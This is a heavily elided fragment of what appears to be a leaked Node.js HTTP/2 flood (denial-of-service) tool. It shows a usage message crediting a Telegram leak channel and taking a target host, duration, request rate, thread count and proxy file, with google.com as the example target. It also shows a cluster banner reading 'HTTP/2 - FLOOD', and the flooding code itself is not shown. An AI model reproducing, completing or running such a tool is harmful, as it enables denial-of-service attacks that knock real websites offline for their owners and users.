...
const secureOptions = 
 ...
 if (process.argv.length < 7){console.log(`Leaked by t.me/leakddosfiles \nUsage: \nnode anus-h2 host time req thread proxy file\nExample: node anus-h2 https://google.com/ 60 64 10 proxy.txt `); process.exit();}
...
if (cluster.isMaster) {
    console.clear();
    console.log(`cute`.bgRed), console.log(`[!] HTTP/2 - FLOOD`);
    console.log(`--------------------------------------------`.gray);
